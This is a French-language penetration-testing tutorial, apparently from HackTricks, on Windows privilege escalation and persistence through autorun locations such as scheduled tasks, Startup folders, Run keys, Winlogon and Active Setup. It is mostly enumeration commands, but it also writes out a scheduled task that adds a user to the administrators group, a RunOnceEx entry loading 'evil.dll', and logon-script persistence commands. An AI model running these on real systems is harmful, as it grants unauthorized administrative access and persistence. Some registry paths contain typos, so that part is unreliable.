# Privilege Escalation avec Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** peut être utilisé pour exécuter des programmes au **démarrage**. Voir quels binaires sont programmés pour s’exécuter au démarrage avec :
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Tâches planifiées

**Tasks** peuvent être planifiées pour s’exécuter avec une **certaine fréquence**. Voir quels binaires sont planifiés pour s’exécuter avec :
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Dossiers

Tous les binaires situés dans les **Startup folders seront exécutés au démarrage**. Les dossiers de démarrage courants sont ceux listés ci-dessous, mais le dossier de démarrage est indiqué dans le registre. [Read this to learn where.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI** : les vulnérabilités de *path traversal* lors de l’extraction d’archives (comme celle exploitée dans WinRAR avant 7.13 – CVE-2025-8088) peuvent être utilisées pour **déposer des payloads directement dans ces dossiers Startup pendant la décompression**, ce qui entraîne une exécution de code lors de la prochaine ouverture de session de l’utilisateur. Pour une analyse approfondie de cette technique, voir :


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): L’entrée de registre **Wow6432Node** indique que vous exécutez une version 64 bits de Windows. Le système d’exploitation utilise cette clé pour afficher une vue distincte de HKEY_LOCAL_MACHINE\SOFTWARE pour les applications 32 bits qui s’exécutent sur des versions 64 bits de Windows.

### Runs

**Communément connus** registre AutoRun :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Les clés de registre connues sous le nom de **Run** et **RunOnce** sont conçues pour exécuter automatiquement des programmes à chaque fois qu’un utilisateur se connecte au système. La ligne de commande associée à la valeur de données d’une clé est limitée à 260 caractères ou moins.

**Service runs** (peuvent contrôler le démarrage automatique des services au boot) :

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx :**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Sur Windows Vista et les versions ultérieures, les clés de registre **Run** et **RunOnce** ne sont pas générées automatiquement. Les entrées dans ces clés peuvent soit lancer directement des programmes, soit les spécifier comme dépendances. Par exemple, pour charger un fichier DLL à la connexion, on peut utiliser la clé de registre **RunOnceEx** avec une clé "Depend". Cela est démontré en ajoutant une entrée de registre pour exécuter "C:\temp\evil.dll" pendant le démarrage du système :
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Si vous pouvez écrire dans l’une des registry mentionnées à l’intérieur de **HKLM**, vous pouvez élever les privilèges lorsqu’un autre utilisateur se connecte.

> [!TIP]
> **Exploit 2**: Si vous pouvez écraser l’un des binaries indiqués dans l’une des registry à l’intérieur de **HKLM**, vous pouvez modifier ce binary avec une backdoor lorsqu’un autre utilisateur se connecte et élever les privilèges.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Les raccourcis placés dans le dossier **Startup** déclencheront automatiquement le lancement de services ou d'applications lors de la connexion d’un utilisateur ou du redémarrage du système. L’emplacement du dossier **Startup** est défini dans le registre pour les étendues **Local Machine** et **Current User**. Cela signifie que tout raccourci ajouté à ces emplacements **Startup** spécifiés garantira que le service ou le programme lié démarre après le processus de connexion ou de redémarrage, ce qui en fait une méthode simple pour planifier l’exécution automatique de programmes.

> [!TIP]
> Si vous pouvez écraser n’importe quel \[User] Shell Folder sous **HKLM**, vous pourrez le pointer vers un dossier contrôlé par vous et y placer une backdoor qui sera exécutée chaque fois qu’un utilisateur se connectera au système, escaladant les privilèges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Cette valeur de registre par utilisateur peut pointer vers un script ou une commande exécutée lorsque cet utilisateur ouvre une session. C’est surtout un mécanisme de **persistence** car il s’exécute uniquement dans le contexte de l’utilisateur concerné, mais il reste pertinent à vérifier lors des revues de post-exploitation et d’autoruns.

> [!TIP]
> Si vous pouvez écrire cette valeur pour l’utilisateur actuel, vous pouvez déclencher à nouveau son exécution lors de la prochaine ouverture de session interactive sans avoir besoin de droits admin. Si vous pouvez l’écrire pour un autre hive utilisateur, vous pouvez obtenir une exécution de code lorsque cet utilisateur ouvre une session.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Notes :

- Préférez des chemins complets vers `.bat`, `.cmd`, `.ps1`, ou d'autres fichiers launcher déjà lisibles par l'utilisateur cible.
- Cela survit au logoff/reboot jusqu'à ce que la valeur soit supprimée.
- Contrairement à `HKLM\...\Run`, cela n'accorde **pas** d'élévation à lui seul ; c'est une persistance à l'échelle de l'utilisateur.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

En général, la clé **Userinit** est définie sur **userinit.exe**. Cependant, si cette clé est modifiée, l'exécutable spécifié sera également lancé par **Winlogon** lors de la connexion de l'utilisateur. De même, la clé **Shell** est censée pointer vers **explorer.exe**, qui est le shell par défaut de Windows.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Si vous pouvez écraser la valeur du registre ou le binaire, vous pourrez élever vos privilèges.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Vérifiez la clé **Run**.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Changer l'invite de commande du Safe Mode

Dans le Windows Registry sous `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot`, il existe une valeur **`AlternateShell`** définie par défaut sur `cmd.exe`. Cela signifie que lorsque vous choisissez "Safe Mode with Command Prompt" au démarrage (en appuyant sur F8), `cmd.exe` est utilisé. Mais il est possible de configurer l'ordinateur pour démarrer automatiquement dans ce mode sans avoir besoin d'appuyer sur F8 et de le sélectionner manuellement.

Étapes pour créer une option de démarrage afin de lancer automatiquement "Safe Mode with Command Prompt" :

1. Changez les attributs du fichier `boot.ini` pour supprimer les flags lecture seule, système et caché : `attrib c:\boot.ini -r -s -h`
2. Ouvrez `boot.ini` pour l'éditer.
3. Insérez une ligne comme : `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Enregistrez les modifications dans `boot.ini`.
5. Réappliquez les attributs d'origine du fichier : `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Modifier la clé de registre **AlternateShell** permet de configurer un shell de commande personnalisé, ce qui peut permettre un accès non autorisé.
- **Exploit 2 (PATH Write Permissions):** Avoir des permissions d'écriture sur n'importe quelle partie de la variable **PATH** du système, en particulier avant `C:\Windows\system32`, permet d'exécuter un `cmd.exe` personnalisé, qui pourrait servir de backdoor si le système démarre en Safe Mode.
- **Exploit 3 (PATH and boot.ini Write Permissions):** L'accès en écriture à `boot.ini` permet un démarrage automatique en Safe Mode, facilitant un accès non autorisé au prochain redémarrage.

Pour vérifier le réglage actuel de **AlternateShell**, utilisez ces commandes :
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup est une fonctionnalité de Windows qui **s’initie avant que l’environnement de bureau soit complètement chargé**. Elle donne la priorité à l’exécution de certaines commandes, qui doivent se terminer avant que la connexion de l’utilisateur ne se poursuive. Ce processus se produit même avant que d’autres entrées de démarrage, comme celles des sections Run ou RunOnce du registre, ne soient déclenchées.

Active Setup est géré via les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

À l’intérieur de ces clés, plusieurs sous-clés existent, chacune correspondant à un composant spécifique. Les valeurs de clé particulièrement intéressantes incluent :

- **IsInstalled:**
- `0` indique que la commande du composant ne s’exécutera pas.
- `1` signifie que la commande s’exécutera une fois pour chaque utilisateur, ce qui est le comportement par défaut si la valeur `IsInstalled` est absente.
- **StubPath:** Définit la commande à exécuter par Active Setup. Cela peut être n’importe quelle ligne de commande valide, comme le lancement de `notepad`.

**Security Insights:**

- Modifier ou écrire dans une clé où **`IsInstalled`** est défini sur `"1"` avec un **`StubPath`** spécifique peut conduire à une exécution de commande non autorisée, potentiellement pour une privilege escalation.
- Modifier le fichier binaire référencé dans toute valeur **`StubPath`** peut également permettre une privilege escalation, avec des permissions suffisantes.

Pour inspecter les configurations **`StubPath`** à travers les composants Active Setup, ces commandes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Overview of Browser Helper Objects (BHOs)

Les Browser Helper Objects (BHOs) sont des modules DLL qui ajoutent des fonctionnalités supplémentaires à Microsoft Internet Explorer. Ils se chargent dans Internet Explorer et Windows Explorer à chaque démarrage. Cependant, leur exécution peut être bloquée en définissant la clé **NoExplorer** sur 1, ce qui empêche leur chargement avec les instances de Windows Explorer.

Les BHOs sont compatibles avec Windows 10 via Internet Explorer 11, mais ils ne sont pas pris en charge dans Microsoft Edge, le navigateur par défaut des versions récentes de Windows.

Pour explorer les BHOs enregistrés sur un système, vous pouvez inspecter les clés de registre suivantes :

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Chaque BHO est représenté par son **CLSID** dans le registre, servant d'identifiant unique. Des informations détaillées sur chaque CLSID peuvent être trouvées sous `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Pour interroger les BHOs dans le registre, ces commandes peuvent être utilisées :
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Extensions Internet Explorer

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Notez que le registre contiendra 1 nouvelle entrée de registre pour chaque dll et qu'elle sera représentée par le **CLSID**. Vous pouvez trouver les informations du CLSID dans `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Command Open

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Options d’exécution des fichiers image
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Notez que tous les sites où vous pouvez trouver des autoruns sont **déjà recherchés par**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe). Cependant, pour une **liste plus complète des fichiers auto-exécutés**, vous pouvez utiliser [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns)de systinternals:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## More

**Trouvez d'autres Autoruns comme des registries dans** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## References

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
